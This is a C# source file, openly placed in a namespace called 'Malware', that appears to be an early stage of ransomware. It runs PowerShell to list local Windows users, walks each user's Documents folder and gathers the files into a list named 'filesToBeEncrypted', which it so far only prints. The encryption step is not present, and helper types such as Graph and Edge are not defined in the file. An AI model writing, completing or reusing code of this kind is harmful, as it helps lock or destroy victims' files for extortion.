using System.Diagnostics;

namespace Malware
{
    class DontLookHere
    {
        public static string ExecuteCommand(string command)
        {
            ProcessStartInfo gettingFun = new ProcessStartInfo();
            gettingFun.FileName = "powershell.exe";
            gettingFun.Arguments = command;
            gettingFun.UseShellExecute = false;
            gettingFun.RedirectStandardOutput = true;

            using Process process = new Process();
            process.StartInfo = gettingFun;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            return output;
        }
        public static List<string> store(string output)
        {
            return output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                .Skip(2)
                .Select(line => line.Trim())
                .Where(line => !string.IsNullOrWhiteSpace(line))
                .ToList();
        }
        public static async Task<List<Edge>> searching(string directories)
        {
            List<Edge> BigFun = await Graph.BFSAsync(directories);
            return BigFun;
        }
        static async Task Main()
        {
           
            string aSimpleCommand = "Get-LocalUser | Select-Object Name";
            string output = ExecuteCommand(aSimpleCommand);
            List<string> userDirectories = new List<string>();
            List<string> users = store(output);
            List<List<Edge>> filesToBeEncrypted = new List<List<Edge>>();
            foreach (string user in users)
            {

                string temp = $@"C:\Users\{user}\Documents";

                userDirectories.Add(temp);
            }
            
            
                foreach (var direecotries in userDirectories)
                {
                    List<Edge> toBeEncrypted = await searching(direecotries);
                    filesToBeEncrypted.Add(toBeEncrypted);
                }
            
            

            for (int i = 0; i < filesToBeEncrypted.Count; i++)
            {
                for (int j = 0; j < filesToBeEncrypted[i].Count; j++)
                {
                    Console.WriteLine(filesToBeEncrypted[i][j]);
                }
            }
        }
    }
}